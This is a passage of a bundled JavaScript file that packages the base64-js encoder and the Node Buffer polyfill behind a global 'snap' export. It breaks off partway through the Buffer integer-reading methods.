var regeneratorRuntime;
(function (f) {
  if (typeof exports === "object" && typeof module !== "undefined") {
    module.exports = f();
  } else if (typeof define === "function" && define.amd) {
    define([], f);
  } else {
    var g;
    if (typeof window !== "undefined") {
      g = window;
    } else if (typeof global !== "undefined") {
      g = global;
    } else if (typeof self !== "undefined") {
      g = self;
    } else {
      g = this;
    }
    g.snap = f();
  }
})(function () {
  var define, module, exports;
  return function () {
    function r(e, n, t) {
      function o(i, f) {
        if (!n[i]) {
          if (!e[i]) {
            var c = "function" == typeof require && require;
            if (!f && c) return c(i, !0);
            if (u) return u(i, !0);
            var a = new Error("Cannot find module '" + i + "'");
            throw a.code = "MODULE_NOT_FOUND", a;
          }
          var p = n[i] = {
            exports: {}
          };
          e[i][0].call(p.exports, function (r) {
            var n = e[i][1][r];
            return o(n || r);
          }, p, p.exports, r, e, n, t);
        }
        return n[i].exports;
      }
      for (var u = "function" == typeof require && require, i = 0; i < t.length; i++) o(t[i]);
      return o;
    }
    return r;
  }()({
    1: [function (require, module, exports) {
      'use strict';

      exports.byteLength = byteLength;
      exports.toByteArray = toByteArray;
      exports.fromByteArray = fromByteArray;
      var lookup = [];
      var revLookup = [];
      var Arr = typeof Uint8Array !== 'undefined' ? Uint8Array : Array;
      var code = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
      for (var i = 0, len = code.length; i < len; ++i) {
        lookup[i] = code[i];
        revLookup[code.charCodeAt(i)] = i;
      }
      revLookup['-'.charCodeAt(0)] = 62;
      revLookup['_'.charCodeAt(0)] = 63;
      function getLens(b64) {
        var len = b64.length;
        if (len % 4 > 0) {
          throw new Error('Invalid string. Length must be a multiple of 4');
        }
        var validLen = b64.indexOf('=');
        if (validLen === -1) validLen = len;
        var placeHoldersLen = validLen === len ? 0 : 4 - validLen % 4;
        return [validLen, placeHoldersLen];
      }
      function byteLength(b64) {
        var lens = getLens(b64);
        var validLen = lens[0];
        var placeHoldersLen = lens[1];
        return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
      }
      function _byteLength(b64, validLen, placeHoldersLen) {
        return (validLen + placeHoldersLen) * 3 / 4 - placeHoldersLen;
      }
      function toByteArray(b64) {
        var tmp;
        var lens = getLens(b64);
        var validLen = lens[0];
        var placeHoldersLen = lens[1];
        var arr = new Arr(_byteLength(b64, validLen, placeHoldersLen));
        var curByte = 0;
        var len = placeHoldersLen > 0 ? validLen - 4 : validLen;
        var i;
        for (i = 0; i < len; i += 4) {
          tmp = revLookup[b64.charCodeAt(i)] << 18 | revLookup[b64.charCodeAt(i + 1)] << 12 | revLookup[b64.charCodeAt(i + 2)] << 6 | revLookup[b64.charCodeAt(i + 3)];
          arr[curByte++] = tmp >> 16 & 0xFF;
          arr[curByte++] = tmp >> 8 & 0xFF;
          arr[curByte++] = tmp & 0xFF;
        }
        if (placeHoldersLen === 2) {
          tmp = revLookup[b64.charCodeAt(i)] << 2 | revLookup[b64.charCodeAt(i + 1)] >> 4;
          arr[curByte++] = tmp & 0xFF;
        }
        if (placeHoldersLen === 1) {
          tmp = revLookup[b64.charCodeAt(i)] << 10 | revLookup[b64.charCodeAt(i + 1)] << 4 | revLookup[b64.charCodeAt(i + 2)] >> 2;
          arr[curByte++] = tmp >> 8 & 0xFF;
          arr[curByte++] = tmp & 0xFF;
        }
        return arr;
      }
      function tripletToBase64(num) {
        return lookup[num >> 18 & 0x3F] + lookup[num >> 12 & 0x3F] + lookup[num >> 6 & 0x3F] + lookup[num & 0x3F];
      }
      function encodeChunk(uint8, start, end) {
        var tmp;
        var output = [];
        for (var i = start; i < end; i += 3) {
          tmp = (uint8[i] << 16 & 0xFF0000) + (uint8[i + 1] << 8 & 0xFF00) + (uint8[i + 2] & 0xFF);
          output.push(tripletToBase64(tmp));
        }
        return output.join('');
      }
      function fromByteArray(uint8) {
        var tmp;
        var len = uint8.length;
        var extraBytes = len % 3;
        var parts = [];
        var maxChunkLength = 16383;
        for (var i = 0, len2 = len - extraBytes; i < len2; i += maxChunkLength) {
          parts.push(encodeChunk(uint8, i, i + maxChunkLength > len2 ? len2 : i + maxChunkLength));
        }
        if (extraBytes === 1) {
          tmp = uint8[len - 1];
          parts.push(lookup[tmp >> 2] + lookup[tmp << 4 & 0x3F] + '==');
        } else if (extraBytes === 2) {
          tmp = (uint8[len - 2] << 8) + uint8[len - 1];
          parts.push(lookup[tmp >> 10] + lookup[tmp >> 4 & 0x3F] + lookup[tmp << 2 & 0x3F] + '=');
        }
        return parts.join('');
      }
    }, {}],
    2: [function (require, module, exports) {}, {}],
    3: [function (require, module, exports) {
      (function () {
        (function () {
          'use strict';

          var base64 = require('base64-js');
          var ieee754 = require('ieee754');
          exports.Buffer = Buffer;
          exports.SlowBuffer = SlowBuffer;
          exports.INSPECT_MAX_BYTES = 50;
          var K_MAX_LENGTH = 0x7fffffff;
          exports.kMaxLength = K_MAX_LENGTH;
          Buffer.TYPED_ARRAY_SUPPORT = typedArraySupport();
          if (!Buffer.TYPED_ARRAY_SUPPORT && typeof console !== 'undefined' && typeof console.error === 'function') {
            console.error('This browser lacks typed array (Uint8Array) support which is required by ' + '`buffer` v5.x. Use `buffer` v4.x if you require old browser support.');
          }
          function typedArraySupport() {
            try {
              var arr = new Uint8Array(1);
              arr.__proto__ = {
                __proto__: Uint8Array.prototype,
                foo: function () {
                  return 42;
                }
              };
              return arr.foo() === 42;
            } catch (e) {
              return false;
            }
          }
          Object.defineProperty(Buffer.prototype, 'parent', {
            enumerable: true,
            get: function () {
              if (!Buffer.isBuffer(this)) return undefined;
              return this.buffer;
            }
          });
          Object.defineProperty(Buffer.prototype, 'offset', {
            enumerable: true,
            get: function () {
              if (!Buffer.isBuffer(this)) return undefined;
              return this.byteOffset;
            }
          });
          function createBuffer(length) {
            if (length > K_MAX_LENGTH) {
              throw new RangeError('The value "' + length + '" is invalid for option "size"');
            }
            var buf = new Uint8Array(length);
            buf.__proto__ = Buffer.prototype;
            return buf;
          }
          function Buffer(arg, encodingOrOffset, length) {
            if (typeof arg === 'number') {
              if (typeof encodingOrOffset === 'string') {
                throw new TypeError('The "string" argument must be of type string. Received type number');
              }
              return allocUnsafe(arg);
            }
            return from(arg, encodingOrOffset, length);
          }
          if (typeof Symbol !== 'undefined' && Symbol.species != null && Buffer[Symbol.species] === Buffer) {
            Object.defineProperty(Buffer, Symbol.species, {
              value: null,
              configurable: true,
              enumerable: false,
              writable: false
            });
          }
          Buffer.poolSize = 8192;
          function from(value, encodingOrOffset, length) {
            if (typeof value === 'string') {
              return fromString(value, encodingOrOffset);
            }
            if (ArrayBuffer.isView(value)) {
              return fromArrayLike(value);
            }
            if (value == null) {
              throw TypeError('The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' + 'or Array-like Object. Received type ' + typeof value);
            }
            if (isInstance(value, ArrayBuffer) || value && isInstance(value.buffer, ArrayBuffer)) {
              return fromArrayBuffer(value, encodingOrOffset, length);
            }
            if (typeof value === 'number') {
              throw new TypeError('The "value" argument must not be of type number. Received type number');
            }
            var valueOf = value.valueOf && value.valueOf();
            if (valueOf != null && valueOf !== value) {
              return Buffer.from(valueOf, encodingOrOffset, length);
            }
            var b = fromObject(value);
            if (b) return b;
            if (typeof Symbol !== 'undefined' && Symbol.toPrimitive != null && typeof value[Symbol.toPrimitive] === 'function') {
              return Buffer.from(value[Symbol.toPrimitive]('string'), encodingOrOffset, length);
            }
            throw new TypeError('The first argument must be one of type string, Buffer, ArrayBuffer, Array, ' + 'or Array-like Object. Received type ' + typeof value);
          }
          Buffer.from = function (value, encodingOrOffset, length) {
            return from(value, encodingOrOffset, length);
          };
          Buffer.prototype.__proto__ = Uint8Array.prototype;
          Buffer.__proto__ = Uint8Array;
          function assertSize(size) {
            if (typeof size !== 'number') {
              throw new TypeError('"size" argument must be of type number');
            } else if (size < 0) {
              throw new RangeError('The value "' + size + '" is invalid for option "size"');
            }
          }
          function alloc(size, fill, encoding) {
            assertSize(size);
            if (size <= 0) {
              return createBuffer(size);
            }
            if (fill !== undefined) {
              return typeof encoding === 'string' ? createBuffer(size).fill(fill, encoding) : createBuffer(size).fill(fill);
            }
            return createBuffer(size);
          }
          Buffer.alloc = function (size, fill, encoding) {
            return alloc(size, fill, encoding);
          };
          function allocUnsafe(size) {
            assertSize(size);
            return createBuffer(size < 0 ? 0 : checked(size) | 0);
          }
          Buffer.allocUnsafe = function (size) {
            return allocUnsafe(size);
          };
          Buffer.allocUnsafeSlow = function (size) {
            return allocUnsafe(size);
          };
          function fromString(string, encoding) {
            if (typeof encoding !== 'string' || encoding === '') {
              encoding = 'utf8';
            }
            if (!Buffer.isEncoding(encoding)) {
              throw new TypeError('Unknown encoding: ' + encoding);
            }
            var length = byteLength(string, encoding) | 0;
            var buf = createBuffer(length);
            var actual = buf.write(string, encoding);
            if (actual !== length) {
              buf = buf.slice(0, actual);
            }
            return buf;
          }
          function fromArrayLike(array) {
            var length = array.length < 0 ? 0 : checked(array.length) | 0;
            var buf = createBuffer(length);
            for (var i = 0; i < length; i += 1) {
              buf[i] = array[i] & 255;
            }
            return buf;
          }
          function fromArrayBuffer(array, byteOffset, length) {
            if (byteOffset < 0 || array.byteLength < byteOffset) {
              throw new RangeError('"offset" is outside of buffer bounds');
            }
            if (array.byteLength < byteOffset + (length || 0)) {
              throw new RangeError('"length" is outside of buffer bounds');
            }
            var buf;
            if (byteOffset === undefined && length === undefined) {
              buf = new Uint8Array(array);
            } else if (length === undefined) {
              buf = new Uint8Array(array, byteOffset);
            } else {
              buf = new Uint8Array(array, byteOffset, length);
            }
            buf.__proto__ = Buffer.prototype;
            return buf;
          }
          function fromObject(obj) {
            if (Buffer.isBuffer(obj)) {
              var len = checked(obj.length) | 0;
              var buf = createBuffer(len);
              if (buf.length === 0) {
                return buf;
              }
              obj.copy(buf, 0, 0, len);
              return buf;
            }
            if (obj.length !== undefined) {
              if (typeof obj.length !== 'number' || numberIsNaN(obj.length)) {
                return createBuffer(0);
              }
              return fromArrayLike(obj);
            }
            if (obj.type === 'Buffer' && Array.isArray(obj.data)) {
              return fromArrayLike(obj.data);
            }
          }
          function checked(length) {
            if (length >= K_MAX_LENGTH) {
              throw new RangeError('Attempt to allocate Buffer larger than maximum ' + 'size: 0x' + K_MAX_LENGTH.toString(16) + ' bytes');
            }
            return length | 0;
          }
          function SlowBuffer(length) {
            if (+length != length) {
              length = 0;
            }
            return Buffer.alloc(+length);
          }
          Buffer.isBuffer = function isBuffer(b) {
            return b != null && b._isBuffer === true && b !== Buffer.prototype;
          };
          Buffer.compare = function compare(a, b) {
            if (isInstance(a, Uint8Array)) a = Buffer.from(a, a.offset, a.byteLength);
            if (isInstance(b, Uint8Array)) b = Buffer.from(b, b.offset, b.byteLength);
            if (!Buffer.isBuffer(a) || !Buffer.isBuffer(b)) {
              throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
            }
            if (a === b) return 0;
            var x = a.length;
            var y = b.length;
            for (var i = 0, len = Math.min(x, y); i < len; ++i) {
              if (a[i] !== b[i]) {
                x = a[i];
                y = b[i];
                break;
              }
            }
            if (x < y) return -1;
            if (y < x) return 1;
            return 0;
          };
          Buffer.isEncoding = function isEncoding(encoding) {
            switch (String(encoding).toLowerCase()) {
              case 'hex':
              case 'utf8':
              case 'utf-8':
              case 'ascii':
              case 'latin1':
              case 'binary':
              case 'base64':
              case 'ucs2':
              case 'ucs-2':
              case 'utf16le':
              case 'utf-16le':
                return true;
              default:
                return false;
            }
          };
          Buffer.concat = function concat(list, length) {
            if (!Array.isArray(list)) {
              throw new TypeError('"list" argument must be an Array of Buffers');
            }
            if (list.length === 0) {
              return Buffer.alloc(0);
            }
            var i;
            if (length === undefined) {
              length = 0;
              for (i = 0; i < list.length; ++i) {
                length += list[i].length;
              }
            }
            var buffer = Buffer.allocUnsafe(length);
            var pos = 0;
            for (i = 0; i < list.length; ++i) {
              var buf = list[i];
              if (isInstance(buf, Uint8Array)) {
                buf = Buffer.from(buf);
              }
              if (!Buffer.isBuffer(buf)) {
                throw new TypeError('"list" argument must be an Array of Buffers');
              }
              buf.copy(buffer, pos);
              pos += buf.length;
            }
            return buffer;
          };
          function byteLength(string, encoding) {
            if (Buffer.isBuffer(string)) {
              return string.length;
            }
            if (ArrayBuffer.isView(string) || isInstance(string, ArrayBuffer)) {
              return string.byteLength;
            }
            if (typeof string !== 'string') {
              throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. ' + 'Received type ' + typeof string);
            }
            var len = string.length;
            var mustMatch = arguments.length > 2 && arguments[2] === true;
            if (!mustMatch && len === 0) return 0;
            var loweredCase = false;
            for (;;) {
              switch (encoding) {
                case 'ascii':
                case 'latin1':
                case 'binary':
                  return len;
                case 'utf8':
                case 'utf-8':
                  return utf8ToBytes(string).length;
                case 'ucs2':
                case 'ucs-2':
                case 'utf16le':
                case 'utf-16le':
                  return len * 2;
                case 'hex':
                  return len >>> 1;
                case 'base64':
                  return base64ToBytes(string).length;
                default:
                  if (loweredCase) {
                    return mustMatch ? -1 : utf8ToBytes(string).length;
                  }
                  encoding = ('' + encoding).toLowerCase();
                  loweredCase = true;
              }
            }
          }
          Buffer.byteLength = byteLength;
          function slowToString(encoding, start, end) {
            var loweredCase = false;
            if (start === undefined || start < 0) {
              start = 0;
            }
            if (start > this.length) {
              return '';
            }
            if (end === undefined || end > this.length) {
              end = this.length;
            }
            if (end <= 0) {
              return '';
            }
            end >>>= 0;
            start >>>= 0;
            if (end <= start) {
              return '';
            }
            if (!encoding) encoding = 'utf8';
            while (true) {
              switch (encoding) {
                case 'hex':
                  return hexSlice(this, start, end);
                case 'utf8':
                case 'utf-8':
                  return utf8Slice(this, start, end);
                case 'ascii':
                  return asciiSlice(this, start, end);
                case 'latin1':
                case 'binary':
                  return latin1Slice(this, start, end);
                case 'base64':
                  return base64Slice(this, start, end);
                case 'ucs2':
                case 'ucs-2':
                case 'utf16le':
                case 'utf-16le':
                  return utf16leSlice(this, start, end);
                default:
                  if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding);
                  encoding = (encoding + '').toLowerCase();
                  loweredCase = true;
              }
            }
          }
          Buffer.prototype._isBuffer = true;
          function swap(b, n, m) {
            var i = b[n];
            b[n] = b[m];
            b[m] = i;
          }
          Buffer.prototype.swap16 = function swap16() {
            var len = this.length;
            if (len % 2 !== 0) {
              throw new RangeError('Buffer size must be a multiple of 16-bits');
            }
            for (var i = 0; i < len; i += 2) {
              swap(this, i, i + 1);
            }
            return this;
          };
          Buffer.prototype.swap32 = function swap32() {
            var len = this.length;
            if (len % 4 !== 0) {
              throw new RangeError('Buffer size must be a multiple of 32-bits');
            }
            for (var i = 0; i < len; i += 4) {
              swap(this, i, i + 3);
              swap(this, i + 1, i + 2);
            }
            return this;
          };
          Buffer.prototype.swap64 = function swap64() {
            var len = this.length;
            if (len % 8 !== 0) {
              throw new RangeError('Buffer size must be a multiple of 64-bits');
            }
            for (var i = 0; i < len; i += 8) {
              swap(this, i, i + 7);
              swap(this, i + 1, i + 6);
              swap(this, i + 2, i + 5);
              swap(this, i + 3, i + 4);
            }
            return this;
          };
          Buffer.prototype.toString = function toString() {
            var length = this.length;
            if (length === 0) return '';
            if (arguments.length === 0) return utf8Slice(this, 0, length);
            return slowToString.apply(this, arguments);
          };
          Buffer.prototype.toLocaleString = Buffer.prototype.toString;
          Buffer.prototype.equals = function equals(b) {
            if (!Buffer.isBuffer(b)) throw new TypeError('Argument must be a Buffer');
            if (this === b) return true;
            return Buffer.compare(this, b) === 0;
          };
          Buffer.prototype.inspect = function inspect() {
            var str = '';
            var max = exports.INSPECT_MAX_BYTES;
            str = this.toString('hex', 0, max).replace(/(.{2})/g, '$1 ').trim();
            if (this.length > max) str += ' ... ';
            return '<Buffer ' + str + '>';
          };
          Buffer.prototype.compare = function compare(target, start, end, thisStart, thisEnd) {
            if (isInstance(target, Uint8Array)) {
              target = Buffer.from(target, target.offset, target.byteLength);
            }
            if (!Buffer.isBuffer(target)) {
              throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. ' + 'Received type ' + typeof target);
            }
            if (start === undefined) {
              start = 0;
            }
            if (end === undefined) {
              end = target ? target.length : 0;
            }
            if (thisStart === undefined) {
              thisStart = 0;
            }
            if (thisEnd === undefined) {
              thisEnd = this.length;
            }
            if (start < 0 || end > target.length || thisStart < 0 || thisEnd > this.length) {
              throw new RangeError('out of range index');
            }
            if (thisStart >= thisEnd && start >= end) {
              return 0;
            }
            if (thisStart >= thisEnd) {
              return -1;
            }
            if (start >= end) {
              return 1;
            }
            start >>>= 0;
            end >>>= 0;
            thisStart >>>= 0;
            thisEnd >>>= 0;
            if (this === target) return 0;
            var x = thisEnd - thisStart;
            var y = end - start;
            var len = Math.min(x, y);
            var thisCopy = this.slice(thisStart, thisEnd);
            var targetCopy = target.slice(start, end);
            for (var i = 0; i < len; ++i) {
              if (thisCopy[i] !== targetCopy[i]) {
                x = thisCopy[i];
                y = targetCopy[i];
                break;
              }
            }
            if (x < y) return -1;
            if (y < x) return 1;
            return 0;
          };
          function bidirectionalIndexOf(buffer, val, byteOffset, encoding, dir) {
            if (buffer.length === 0) return -1;
            if (typeof byteOffset === 'string') {
              encoding = byteOffset;
              byteOffset = 0;
            } else if (byteOffset > 0x7fffffff) {
              byteOffset = 0x7fffffff;
            } else if (byteOffset < -0x80000000) {
              byteOffset = -0x80000000;
            }
            byteOffset = +byteOffset;
            if (numberIsNaN(byteOffset)) {
              byteOffset = dir ? 0 : buffer.length - 1;
            }
            if (byteOffset < 0) byteOffset = buffer.length + byteOffset;
            if (byteOffset >= buffer.length) {
              if (dir) return -1;else byteOffset = buffer.length - 1;
            } else if (byteOffset < 0) {
              if (dir) byteOffset = 0;else return -1;
            }
            if (typeof val === 'string') {
              val = Buffer.from(val, encoding);
            }
            if (Buffer.isBuffer(val)) {
              if (val.length === 0) {
                return -1;
              }
              return arrayIndexOf(buffer, val, byteOffset, encoding, dir);
            } else if (typeof val === 'number') {
              val = val & 0xFF;
              if (typeof Uint8Array.prototype.indexOf === 'function') {
                if (dir) {
                  return Uint8Array.prototype.indexOf.call(buffer, val, byteOffset);
                } else {
                  return Uint8Array.prototype.lastIndexOf.call(buffer, val, byteOffset);
                }
              }
              return arrayIndexOf(buffer, [val], byteOffset, encoding, dir);
            }
            throw new TypeError('val must be string, number or Buffer');
          }
          function arrayIndexOf(arr, val, byteOffset, encoding, dir) {
            var indexSize = 1;
            var arrLength = arr.length;
            var valLength = val.length;
            if (encoding !== undefined) {
              encoding = String(encoding).toLowerCase();
              if (encoding === 'ucs2' || encoding === 'ucs-2' || encoding === 'utf16le' || encoding === 'utf-16le') {
                if (arr.length < 2 || val.length < 2) {
                  return -1;
                }
                indexSize = 2;
                arrLength /= 2;
                valLength /= 2;
                byteOffset /= 2;
              }
            }
            function read(buf, i) {
              if (indexSize === 1) {
                return buf[i];
              } else {
                return buf.readUInt16BE(i * indexSize);
              }
            }
            var i;
            if (dir) {
              var foundIndex = -1;
              for (i = byteOffset; i < arrLength; i++) {
                if (read(arr, i) === read(val, foundIndex === -1 ? 0 : i - foundIndex)) {
                  if (foundIndex === -1) foundIndex = i;
                  if (i - foundIndex + 1 === valLength) return foundIndex * indexSize;
                } else {
                  if (foundIndex !== -1) i -= i - foundIndex;
                  foundIndex = -1;
                }
              }
            } else {
              if (byteOffset + valLength > arrLength) byteOffset = arrLength - valLength;
              for (i = byteOffset; i >= 0; i--) {
                var found = true;
                for (var j = 0; j < valLength; j++) {
                  if (read(arr, i + j) !== read(val, j)) {
                    found = false;
                    break;
                  }
                }
                if (found) return i;
              }
            }
            return -1;
          }
          Buffer.prototype.includes = function includes(val, byteOffset, encoding) {
            return this.indexOf(val, byteOffset, encoding) !== -1;
          };
          Buffer.prototype.indexOf = function indexOf(val, byteOffset, encoding) {
            return bidirectionalIndexOf(this, val, byteOffset, encoding, true);
          };
          Buffer.prototype.lastIndexOf = function lastIndexOf(val, byteOffset, encoding) {
            return bidirectionalIndexOf(this, val, byteOffset, encoding, false);
          };
          function hexWrite(buf, string, offset, length) {
            offset = Number(offset) || 0;
            var remaining = buf.length - offset;
            if (!length) {
              length = remaining;
            } else {
              length = Number(length);
              if (length > remaining) {
                length = remaining;
              }
            }
            var strLen = string.length;
            if (length > strLen / 2) {
              length = strLen / 2;
            }
            for (var i = 0; i < length; ++i) {
              var parsed = parseInt(string.substr(i * 2, 2), 16);
              if (numberIsNaN(parsed)) return i;
              buf[offset + i] = parsed;
            }
            return i;
          }
          function utf8Write(buf, string, offset, length) {
            return blitBuffer(utf8ToBytes(string, buf.length - offset), buf, offset, length);
          }
          function asciiWrite(buf, string, offset, length) {
            return blitBuffer(asciiToBytes(string), buf, offset, length);
          }
          function latin1Write(buf, string, offset, length) {
            return asciiWrite(buf, string, offset, length);
          }
          function base64Write(buf, string, offset, length) {
            return blitBuffer(base64ToBytes(string), buf, offset, length);
          }
          function ucs2Write(buf, string, offset, length) {
            return blitBuffer(utf16leToBytes(string, buf.length - offset), buf, offset, length);
          }
          Buffer.prototype.write = function write(string, offset, length, encoding) {
            if (offset === undefined) {
              encoding = 'utf8';
              length = this.length;
              offset = 0;
            } else if (length === undefined && typeof offset === 'string') {
              encoding = offset;
              length = this.length;
              offset = 0;
            } else if (isFinite(offset)) {
              offset = offset >>> 0;
              if (isFinite(length)) {
                length = length >>> 0;
                if (encoding === undefined) encoding = 'utf8';
              } else {
                encoding = length;
                length = undefined;
              }
            } else {
              throw new Error('Buffer.write(string, encoding, offset[, length]) is no longer supported');
            }
            var remaining = this.length - offset;
            if (length === undefined || length > remaining) length = remaining;
            if (string.length > 0 && (length < 0 || offset < 0) || offset > this.length) {
              throw new RangeError('Attempt to write outside buffer bounds');
            }
            if (!encoding) encoding = 'utf8';
            var loweredCase = false;
            for (;;) {
              switch (encoding) {
                case 'hex':
                  return hexWrite(this, string, offset, length);
                case 'utf8':
                case 'utf-8':
                  return utf8Write(this, string, offset, length);
                case 'ascii':
                  return asciiWrite(this, string, offset, length);
                case 'latin1':
                case 'binary':
                  return latin1Write(this, string, offset, length);
                case 'base64':
                  return base64Write(this, string, offset, length);
                case 'ucs2':
                case 'ucs-2':
                case 'utf16le':
                case 'utf-16le':
                  return ucs2Write(this, string, offset, length);
                default:
                  if (loweredCase) throw new TypeError('Unknown encoding: ' + encoding);
                  encoding = ('' + encoding).toLowerCase();
                  loweredCase = true;
              }
            }
          };
          Buffer.prototype.toJSON = function toJSON() {
            return {
              type: 'Buffer',
              data: Array.prototype.slice.call(this._arr || this, 0)
            };
          };
          function base64Slice(buf, start, end) {
            if (start === 0 && end === buf.length) {
              return base64.fromByteArray(buf);
            } else {
              return base64.fromByteArray(buf.slice(start, end));
            }
          }
          function utf8Slice(buf, start, end) {
            end = Math.min(buf.length, end);
            var res = [];
            var i = start;
            while (i < end) {
              var firstByte = buf[i];
              var codePoint = null;
              var bytesPerSequence = firstByte > 0xEF ? 4 : firstByte > 0xDF ? 3 : firstByte > 0xBF ? 2 : 1;
              if (i + bytesPerSequence <= end) {
                var secondByte, thirdByte, fourthByte, tempCodePoint;
                switch (bytesPerSequence) {
                  case 1:
                    if (firstByte < 0x80) {
                      codePoint = firstByte;
                    }
                    break;
                  case 2:
                    secondByte = buf[i + 1];
                    if ((secondByte & 0xC0) === 0x80) {
                      tempCodePoint = (firstByte & 0x1F) << 0x6 | secondByte & 0x3F;
                      if (tempCodePoint > 0x7F) {
                        codePoint = tempCodePoint;
                      }
                    }
                    break;
                  case 3:
                    secondByte = buf[i + 1];
                    thirdByte = buf[i + 2];
                    if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80) {
                      tempCodePoint = (firstByte & 0xF) << 0xC | (secondByte & 0x3F) << 0x6 | thirdByte & 0x3F;
                      if (tempCodePoint > 0x7FF && (tempCodePoint < 0xD800 || tempCodePoint > 0xDFFF)) {
                        codePoint = tempCodePoint;
                      }
                    }
                    break;
                  case 4:
                    secondByte = buf[i + 1];
                    thirdByte = buf[i + 2];
                    fourthByte = buf[i + 3];
                    if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80 && (fourthByte & 0xC0) === 0x80) {
                      tempCodePoint = (firstByte & 0xF) << 0x12 | (secondByte & 0x3F) << 0xC | (thirdByte & 0x3F) << 0x6 | fourthByte & 0x3F;
                      if (tempCodePoint > 0xFFFF && tempCodePoint < 0x110000) {
                        codePoint = tempCodePoint;
                      }
                    }
                }
              }
              if (codePoint === null) {
                codePoint = 0xFFFD;
                bytesPerSequence = 1;
              } else if (codePoint > 0xFFFF) {
                codePoint -= 0x10000;
                res.push(codePoint >>> 10 & 0x3FF | 0xD800);
                codePoint = 0xDC00 | codePoint & 0x3FF;
              }
              res.push(codePoint);
              i += bytesPerSequence;
            }
            return decodeCodePointsArray(res);
          }
          var MAX_ARGUMENTS_LENGTH = 0x1000;
          function decodeCodePointsArray(codePoints) {
            var len = codePoints.length;
            if (len <= MAX_ARGUMENTS_LENGTH) {
              return String.fromCharCode.apply(String, codePoints);
            }
            var res = '';
            var i = 0;
            while (i < len) {
              res += String.fromCharCode.apply(String, codePoints.slice(i, i += MAX_ARGUMENTS_LENGTH));
            }
            return res;
          }
          function asciiSlice(buf, start, end) {
            var ret = '';
            end = Math.min(buf.length, end);
            for (var i = start; i < end; ++i) {
              ret += String.fromCharCode(buf[i] & 0x7F);
            }
            return ret;
          }
          function latin1Slice(buf, start, end) {
            var ret = '';
            end = Math.min(buf.length, end);
            for (var i = start; i < end; ++i) {
              ret += String.fromCharCode(buf[i]);
            }
            return ret;
          }
          function hexSlice(buf, start, end) {
            var len = buf.length;
            if (!start || start < 0) start = 0;
            if (!end || end < 0 || end > len) end = len;
            var out = '';
            for (var i = start; i < end; ++i) {
              out += toHex(buf[i]);
            }
            return out;
          }
          function utf16leSlice(buf, start, end) {
            var bytes = buf.slice(start, end);
            var res = '';
            for (var i = 0; i < bytes.length; i += 2) {
              res += String.fromCharCode(bytes[i] + bytes[i + 1] * 256);
            }
            return res;
          }
          Buffer.prototype.slice = function slice(start, end) {
            var len = this.length;
            start = ~~start;
            end = end === undefined ? len : ~~end;
            if (start < 0) {
              start += len;
              if (start < 0) start = 0;
            } else if (start > len) {
              start = len;
            }
            if (end < 0) {
              end += len;
              if (end < 0) end = 0;
            } else if (end > len) {
              end = len;
            }
            if (end < start) end = start;
            var newBuf = this.subarray(start, end);
            newBuf.__proto__ = Buffer.prototype;
            return newBuf;
          };
          function checkOffset(offset, ext, length) {
            if (offset % 1 !== 0 || offset < 0) throw new RangeError('offset is not uint');
            if (offset + ext > length) throw new RangeError('Trying to access beyond buffer length');
          }
          Buffer.prototype.readUIntLE = function readUIntLE(offset, byteLength, noAssert) {
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) checkOffset(offset, byteLength, this.length);
            var val = this[offset];
            var mul = 1;
            var i = 0;
            while (++i < byteLength && (mul *= 0x100)) {
              val += this[offset + i] * mul;
            }
            return val;
          };
          Buffer.prototype.readUIntBE = function readUIntBE(offset, byteLength, noAssert) {
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) {
              checkOffset(offset, byteLength, this.length);
            }
            var val = this[offset + --byteLength];
            var mul = 1;
            while (byteLength > 0 && (mul *= 0x100)) {
              val += this[offset + --byteLength] * mul;
            }
            return val;
          };
          Buffer.prototype.readUInt8 = function readUInt8(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 1, this.length);
            return this[offset];
          };
          Buffer.prototype.readUInt16LE = function readUInt16LE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 2, this.length);
            return this[offset] | this[offset + 1] << 8;
          };
          Buffer.prototype.readUInt16BE = function readUInt16BE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 2, this.length);
            return this[offset] << 8 | this[offset + 1];
          };
          Buffer.prototype.readUInt32LE = function readUInt32LE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return (this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16) + this[offset + 3] * 0x1000000;
          };
          Buffer.prototype.readUInt32BE = function readUInt32BE(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 4, this.length);
            return this[offset] * 0x1000000 + (this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3]);
          };
          Buffer.prototype.readIntLE = function readIntLE(offset, byteLength, noAssert) {
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) checkOffset(offset, byteLength, this.length);
            var val = this[offset];
            var mul = 1;
            var i = 0;
            while (++i < byteLength && (mul *= 0x100)) {
              val += this[offset + i] * mul;
            }
            mul *= 0x80;
            if (val >= mul) val -= Math.pow(2, 8 * byteLength);
            return val;
          };
          Buffer.prototype.readIntBE = function readIntBE(offset, byteLength, noAssert) {
            offset = offset >>> 0;
            byteLength = byteLength >>> 0;
            if (!noAssert) checkOffset(offset, byteLength, this.length);
            var i = byteLength;
            var mul = 1;
            var val = this[offset + --i];
            while (i > 0 && (mul *= 0x100)) {
              val += this[offset + --i] * mul;
            }
            mul *= 0x80;
            if (val >= mul) val -= Math.pow(2, 8 * byteLength);
            return val;
          };
          Buffer.prototype.readInt8 = function readInt8(offset, noAssert) {
            offset = offset >>> 0;
            if (!noAssert) checkOffset(offset, 1, this.length);
            if (!(this[offset] & 0x80)) return this[offset];
            return (0xff - this[offset] + 1) * -1;
          };
          Buffer.prototype.readInt16LE = function readInt16LE(offset, noAssert) {
            offset = offset >>> 0;
